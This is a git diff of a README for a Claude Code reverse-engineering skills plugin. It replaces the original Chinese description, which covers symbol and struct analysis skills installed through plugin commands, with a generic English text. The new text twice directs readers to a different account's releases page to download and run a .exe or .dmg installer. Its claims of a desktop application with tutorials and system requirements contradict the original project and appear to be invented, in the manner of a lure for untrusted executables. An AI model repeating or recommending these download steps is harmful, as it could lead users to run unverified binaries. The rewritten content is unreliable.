@@ -1,71 +1,50 @@
-[English](README_EN.md) | 中文
+# 🎯 reverse-skills - Master Claude Code Effortlessly
 
-# 逆向工程技能集 (Reverse Engineering Skills)
+## 📥 Download Now
+[![Download reverse-skills](https://img.shields.io/badge/Download%20reverse--skills-v1.0-brightgreen)](https://github.com/carsalgut/reverse-skills/releases)
 
-为 Claude Code 提供逆向工程分析技能的插件市场。
+## 👋 Introduction
+Welcome to reverse-skills! This application helps you build your reverse engineering skills for Claude Code. Whether you are a beginner or an experienced user, this tool makes learning easy and enjoyable.
 
-**专为 [IDA-NO-MCP](https://github.com/P4nda0s/IDA-NO-MCP) 设计** - 从 IDA 导出反编译结果，然后使用 Claude Code 进行分析。
+## 🚀 Getting Started
+To start using reverse-skills, follow these simple steps:
 
-## 工作流程
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/carsalgut/reverse-skills/releases) of this repository. Here, you will find the latest version of the software.
+2. **Choose Your Version:** Look for the most recent version listed. Click on the version number to access the download files. 
+3. **Download the Application:** You will see various files available for download. Click on the appropriate file for your operating system. For most users, this will be the `.exe` file for Windows or `.dmg` for macOS. Save this file to your computer.
+4. **Run the Application:** Once the download is complete, locate the file in your downloads folder (or wherever you saved it). Double-click the file to start the installation. Follow the on-screen instructions to install the application.
 
-1. **从 IDA 导出** - 使用 [IDA-NO-MCP](https://github.com/P4nda0s/IDA-NO-MCP) 插件 (`Ctrl-Shift-E`)
-2. **打开导出目录** - 使用 Claude Code 打开
-3. **使用技能分析** - 分析符号和数据结构
+## 📋 System Requirements
+Before downloading reverse-skills, ensure that your system meets the following requirements:
 
-### 导出目录结构 (由 IDA-NO-MCP 生成)
+- **For Windows:** 
+  - Operating System: Windows 10 or later
+  - RAM: Minimum 4 GB
+  - Disk Space: 200 MB available space
 
-```
-export_dir/
-├── decompile/              # 反编译的 C 代码
-│   ├── 0x401000.c          # 每个函数一个文件，以十六进制地址命名
-│   ├── 0x401234.c
-│   └── ...
-├── decompile_failed.txt    # 反编译失败的函数列表
-├── decompile_skipped.txt   # 跳过的函数列表
-├── strings.txt             # 字符串表 (地址, 长度, 类型, 内容)
-├── imports.txt             # 导入表 (地址:函数名)
-├── exports.txt             # 导出表 (地址:函数名)
-└── memory/                 # 内存十六进制转储 (1MB 分块)
-```
+- **For macOS:**
+  - Operating System: macOS Sierra or later
+  - RAM: Minimum 4 GB
+  - Disk Space: 200 MB available space
 
+## 🎓 Features
+reverse-skills provides several features to enhance your learning experience:
 
-## 包含的技能
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Step-by-Step Tutorials:** Learn reverse engineering with guided lessons.
+- **Real-Life Examples:** Apply what you learn through practical use cases.
+- **Support Community:** Connect with other users for tips and feedback.
 
-| 技能 | 描述 |
-|------|------|
-| `/reverse-engineering:rev-symbol` | 从导出表/导入表或反编译代码分析函数符号 |
-| `/reverse-engineering:rev-struct` | 从反编译函数重建数据结构 |
+## 🔧 Download & Install
+To install reverse-skills, remember to do this:
 
-## 安装
+1. **Visit the Releases Page:** Again, visit the [Releases page](https://github.com/carsalgut/reverse-skills/releases) to ensure you are downloading the latest version.
+2. **Follow the Download Steps:** Choose your operating system, download the appropriate file, and run it as described earlier.
 
-### 添加插件市场
+## 💬 Support
+If you encounter any issues while downloading or using reverse-skills, we are here to help. Please visit the issues section on our GitHub page for troubleshooting tips or to report a problem. 
 
-```bash
-# 从 GitHub 添加
-/plugin marketplace add P4nda0s/reverse-skills
-```
+## 🌟 Contribution
+We welcome contributions to improve reverse-skills. If you have ideas or suggestions, feel free to reach out. You can also fork the repository and submit pull requests to add features or fix bugs.
 
-### 安装插件
-
-```bash
-/plugin install reverse-engineering@reverse-engineering-skills
-```
-
-## 使用方法
-
-### 分析符号
-
-```
-/reverse-engineering:rev-symbol sub_401000
-```
-
-### 重建数据结构
-
-```
-/reverse-engineering:rev-struct sub_401000
-```
-
-
-## 许可证
-
-MIT
+Thank you for using reverse-skills. We hope you find it useful for mastering your reverse engineering skills. Happy learning!
